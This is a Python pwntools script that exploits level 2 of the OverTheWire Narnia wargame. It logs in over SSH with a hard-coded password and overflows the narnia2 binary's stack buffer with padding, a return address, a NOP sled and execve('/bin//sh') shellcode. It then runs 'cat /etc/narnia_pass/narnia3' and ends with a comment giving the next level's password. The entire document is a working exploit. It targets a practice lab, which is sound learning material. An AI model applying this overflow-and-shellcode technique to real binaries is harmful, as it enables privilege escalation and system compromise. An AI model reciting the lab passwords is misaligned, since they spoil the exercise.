from pwn import *
context.os = 'linux'
context.arch = 'x86'
# vars ...
user = 'narnia2'
host = 'narnia.labs.overthewire.org'
password = 'nairiepecu'
shell = ssh(user, host, password=password)
############################################

exp = 'A'*140 + '\xc2\x84\x04\x08' + '\x64\xdb\xff\xff' + '\x90'*30 + '\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80'  + '\x50\xdd\xff\xff'
# [padding] + [return code] + [address inside nopsled] + [nopsled] + [shellcode]

s = shell.process(['/narnia/narnia2',
    exp])
s.recvuntil('$ ').decode()
s.sendline('whoami')
t = s.recvuntil('$ ').decode()[:7]
log.info('current user: ' + t)
if t == 'narnia3':
    s.sendline('cat /etc/narnia_pass/narnia3')
    log.success(s.recvuntil('$ ').decode().strip()[:-1])
else:
    log.critical('Exploit failed!!!')


#pass vaequeezee
